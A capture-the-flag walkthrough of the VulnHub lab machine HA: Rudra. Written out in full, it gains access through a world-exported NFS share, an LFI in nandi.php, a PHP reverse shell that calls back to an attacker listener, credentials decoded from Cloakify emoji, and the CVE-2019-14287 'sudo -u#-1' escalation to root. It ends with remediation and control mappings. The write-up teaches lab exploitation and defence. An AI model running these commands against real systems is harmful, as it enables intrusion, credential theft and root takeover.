# HA: Rudra — The Fierce One Hides Secrets in Emoji, Then CVE-2019-14287 Breaks the Chains

Rudra is the ancient Vedic deity of storm and wilderness, the fierce form of Shiva before he became Shankara. Untamed, precise, and dangerous when provoked. HA: Rudra lives up to the name. An NFS share hands you a foothold through LFI. MySQL tables point to emoji-encoded credentials via the Cloakify steganography tool. And CVE-2019-14287, the notorious sudo user ID bypass, delivers root by turning `-1` into `0`. Wild technique, dude. Slept on in most writeup catalogs, but not here.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | HA: Rudra |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-rudra,445/ |
| **Techniques** | Nmap service enumeration, NFS share enumeration and mount, dirb LFI discovery, PHP reverse shell via NFS+LFI chain, shell stabilization, MySQL credential enumeration, Cloakify emoji steganography decode, SSH login, CVE-2019-14287 sudo bypass |
| **CVEs** | CVE-2019-14287 (sudo privilege bypass via user ID -1), CWE-22 (Path Traversal: LFI via file parameter), CWE-284 (Improper Access Control: NFS exported to wildcard) |
| **APT Groups** | APT33: chains NFS exposure with web LFI for initial access in Linux infrastructure targets; APT41: uses filesystem steganography and encoding to store credentials, bypassing standard secret detection tools |

---

## Attack Summary

```
nmap → SSH (22), HTTP (80), NFS (2049)
  → showmount -e → /home/shivay exported to *
  → mkdir /tmp/ignite && mount -t nfs target:/home/shivay /tmp/ignite
  → ls /tmp/ignite → mahadev.txt (hints)
  → dirb http://target → robots.txt → nandi.php
  → curl nandi.php?file=/etc/passwd → LFI confirmed
  → users: rudra, shivay, mahakaal
  → cp php-reverse-shell.php /tmp/ignite/shell.php
  → nc -lvnp 4444 (attacker)
  → curl nandi.php?file=/home/shivay/shell.php → reverse shell
  → mysql -u root → use mahadev; select * from hint
  → hint: check /media → Cloakify tool mentioned
  → cat /media/creds → emoji-encoded credential
  → cloakifyFactory.py → Decloakify → emoji cipher → mahakaal:kalbhairav
  → ssh mahakaal@target
  → sudo -l → (ALL) /usr/bin/watch
  → sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0'
  → uid=0(root) → cat /root/final.txt
```

---

## Methodology

1. Host discovery and full port scan (TCP + check for NFS 2049)
2. NFS share enumeration and mount of /home/shivay
3. Directory brute-force to find nandi.php LFI entry point
4. LFI confirmation via /etc/passwd read
5. PHP reverse shell placed in NFS share, triggered via LFI parameter
6. Shell stabilization
7. MySQL enumeration for credential hints
8. Cloakify emoji steganography decode to recover mahakaal credentials
9. SSH as mahakaal
10. CVE-2019-14287 sudo watch bypass to root

---

## Step 1 — Host Discovery and Port Scan

```bash
netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -A 192.168.1.101
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd
2049/tcp open  nfs     (NFS service)
```

NFS on port 2049 is the critical find. Enumerate it immediately.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — NFS Enumeration and Mount

```bash
showmount -e 192.168.1.101
```

```
Export list for 192.168.1.101:
/home/shivay  *
```

The NFS share is exported to wildcard (`*`) — any host can mount it. Mount it:

```bash
mkdir /tmp/ignite
mount -t nfs 192.168.1.101:/home/shivay /tmp/ignite
ls -la /tmp/ignite
cat /tmp/ignite/mahadev.txt
```

`mahadev.txt` contains hints about the machine. Keep it in mind during enumeration.

**Real-world note:** NFS shares exported to `*` (world-accessible) allow any machine on the network to mount the share and read or write files, depending on permissions. This is a critical misconfiguration that enables the NFS+LFI chained attack in this machine. Multiple enterprise environments still have world-accessible NFS exports from legacy migrations.

**MITRE ATT&CK:** T1135 — Network Share Discovery; T1039 — Data from Network Shared Drive

---

## Step 3 — Directory Brute-Force to Find LFI Entry Point

```bash
dirb http://192.168.1.101/
# Output includes: robots.txt → nandi.php
```

Browse robots.txt:

```bash
curl http://192.168.1.101/robots.txt
# Disallow: /nandi.php (or direct pointer)
```

Access `http://192.168.1.101/nandi.php` — blank page. Expects a `file` parameter.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 4 — Confirm LFI

```bash
curl "http://192.168.1.101/nandi.php?file=/etc/passwd"
```

The server returns the full `/etc/passwd`. LFI confirmed.

Users identified from passwd: `rudra`, `shivay`, `mahakaal`.

```bash
curl "http://192.168.1.101/nandi.php?file=/etc/shadow"
# Likely no read access (permission denied) — but LFI to RCE via NFS is the path
```

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1203 — Exploitation for Client Execution

---

## Step 5 — PHP Reverse Shell via NFS + LFI

Because we have write access to the NFS-mounted `/home/shivay`, we can place a PHP shell there and trigger it through the LFI parameter:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/ignite/shell.php
# Edit shell.php: $ip = '192.168.1.108'; $port = 4444;
```

Start the listener:

```bash
nc -lvnp 4444
```

Trigger the shell via LFI:

```bash
curl "http://192.168.1.101/nandi.php?file=/home/shivay/shell.php"
```

Reverse shell as `www-data` connects.

**Real-world note:** The NFS+LFI chain is a precision attack: NFS provides file write access to a location the web server can read, and LFI provides execution. Neither vulnerability alone gives code execution; the combination does. This is why defense-in-depth matters.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 6 — Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## Step 7 — MySQL Enumeration for Hints

MySQL is running locally:

```bash
netstat -tulnp | grep 3306
# 127.0.0.1:3306

# Check mahadev.txt hint for MySQL root password
mysql -u root -p
# Try: password from mahadev.txt or empty
use mahadev;
show tables;
select * from hint;
```

The hint table points to files in `/media` and mentions the Cloakify tool.

**MITRE ATT&CK:** T1005 — Data from Local System; T1083 — File and Directory Discovery

---

## Step 8 — Cloakify Emoji Decode: Credential Recovery

```bash
ls /media
# creds  hint

cat /media/creds
# Shows emoji characters (unicode symbols encoding a hidden credential)
```

On the attacker machine, use Cloakify Factory to decode:

```bash
git clone https://github.com/TryCatchHCF/Cloakify
cd Cloakify
python cloakifyFactory.py
```

Select option 2 (Decloakify), choose the emoji cipher from the list, paste the content of `creds`, select "no noise added."

Decoded credential: **`mahakaal:kalbhairav`**

**Real-world note:** Text-based steganography using Unicode symbol sets (emoji, Braille, playing cards) encodes arbitrary data in plain sight. Cloakify is used by red teamers to exfiltrate data through communication channels that filter for "suspicious" content patterns. Its presence on a victim system is an indicator of compromise in real environments.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1552 — Unsecured Credentials

---

## Step 9 — SSH Login as mahakaal

```bash
ssh mahakaal@192.168.1.101
# Password: kalbhairav
```

Check sudo rights:

```bash
sudo -l
```

Output:

```
(ALL) /usr/bin/watch
```

mahakaal can run `watch` as any user. The restriction looks limiting — but CVE-2019-14287 changes everything.

**MITRE ATT&CK:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Step 10 — CVE-2019-14287: Sudo User ID Bypass to Root

CVE-2019-14287 affects sudo versions before 1.8.28. When sudoers uses `(ALL)` instead of `(ALL:ALL)`, passing user ID `-1` to sudo bypasses restrictions because C interprets `getpwuid(-1)` as returning UID 0 (root):

```bash
sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0'
```

Root shell obtained.

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
cd /root
cat final.txt
```

(☞ﾟヮﾟ)☞ Root. Rudra's storm subdued.

**Real-world note:** CVE-2019-14287 was disclosed in October 2019 and patched in sudo 1.8.28. Many organizations running older Ubuntu or Debian versions still had unpatched sudo months after the disclosure. The technique exploits a specific edge case in how sudo parses user identifiers, making it a highly targeted but reliable escalation when the condition is met.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Hint | mahadev.txt contents | NFS mounted /home/shivay | Enumeration context |
| LFI data | /etc/passwd contents | nandi.php?file=/etc/passwd | User enumeration |
| Initial shell | www-data | NFS+LFI PHP shell chain | Foothold |
| Cloakify credential | mahakaal:kalbhairav | /media/creds (emoji decoded) | SSH login |
| Root flag | /root/final.txt | CVE-2019-14287 sudo bypass | Captured |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | NFS exported to wildcard enables chained NFS+LFI attack | World-accessible NFS exports are a critical misconfiguration in enterprise Linux environments | Restrict NFS exports to specific client IPs; always mount with nosuid,noexec options |
| 2 | LFI to NFS shell chain: neither vulnerability alone gives RCE | Defense-in-depth is demonstrated by contrast: patch both LFI and NFS to break the chain | Address each vulnerability independently; combined vulnerabilities create critical severity even when individuals are lower |
| 3 | Emoji steganography (Cloakify) hides credentials in plain sight | Used in red team data exfiltration; its presence on a system indicates compromise | Implement DLP controls that check Unicode encoding patterns; treat Cloakify as an IoC |
| 4 | CVE-2019-14287: sudo -u#-1 bypasses user restrictions | Affected all sudo versions before 1.8.28; many systems were exposed for months post-disclosure | Patch sudo immediately; verify sudo version: `sudo --version` (must be 1.8.28+) |
| 5 | MySQL hint table leads to credential location | Databases are often used by CTF designers to store hints, but real attackers find credential tables too | Always enumerate all databases and tables during post-exploitation |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Network Share Discovery | T1135 |
| Collection | Collection | Data from Network Shared Drive | T1039 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Credential Access | Credential Access | Unsecured Credentials | T1552 |
| Credential Access | Credential Access | Obfuscated Files or Information (Cloakify) | T1027 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo (CVE-2019-14287) | T1548.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Restrict NFS exports**: change `/etc/exports` from `*` to specific client IPs; remount with `nosuid,noexec,nodev` options
2. **Patch the LFI in nandi.php**: whitelist allowed file paths; never pass `$_GET['file']` directly to `include()` or `file_get_contents()`
3. **Patch sudo**: upgrade to version 1.8.28 or later — `apt upgrade sudo`
4. **Remove Cloakify from system**: if found, treat as IoC; investigate how it got there; check for data exfiltration
5. **Rotate mahakaal credentials**: kalbhairav is compromised; rotate immediately
6. **Restrict MySQL**: run MySQL as a non-root user; enforce strong passwords; restrict network access

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (NFS export restrictions; LFI patch)
- **D3-OAM** — Operating System Administrative Management (sudo patch; NFS mount options)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in filesystem outside secrets manager)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory NFS exports; audit sudo versions across all Linux hosts |
| Protect | Access Control | Restrict NFS to specific hosts; patch sudo; fix LFI |
| Protect | Data Security | Remove credentials from filesystem; use secrets manager |
| Detect | Anomalies and Events | Alert on NFS mount from unexpected hosts; detect LFI attempts |
| Respond | Response Planning | Patch CVE-2019-14287; rotate exposed credentials; remove Cloakify |
| Recover | Recovery Planning | Audit all NFS exports; verify sudo version on all Linux hosts |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | NFS export restrictions; LFI file path whitelisting |
| AC-6 | Least Privilege | Remove unrestricted sudo entries; patch CVE-2019-14287 |
| SI-2 | Flaw Remediation | Patch sudo to 1.8.28+; patch LFI in nandi.php |
| SI-10 | Information Input Validation | Whitelist file parameter in LFI-affected scripts |
| CM-6 | Configuration Settings | NFS mount with nosuid,noexec; restrict MySQL user |
| SC-28 | Protection of Information at Rest | No credentials in filesystem files; use centralized secrets management |

### CISA KEV

CVE-2019-14287 (sudo privilege escalation) is a critical privilege escalation vulnerability documented in multiple CISA advisories. Organizations should verify sudo version on all Linux hosts and apply patches per CISA guidance on patch management.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL3 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

HA: Rudra is a technically rich machine that rewards patience and thoroughness. The NFS+LFI chain is elegant, the Cloakify decode is unique (most CTF players have never seen emoji-encoded credentials before), and CVE-2019-14287 is a real-world CVE that affected production systems globally.

Rudra the fierce one tests your full toolkit. Miss the UDP scan? You miss NFS. Skip MySQL enumeration? You miss the Cloakify hint. Don't know CVE-2019-14287? The sudo entry looks useless. Know all three? You dance through this machine like the storm itself.

Thanks guys!! (❍ᴥ❍ʋ)
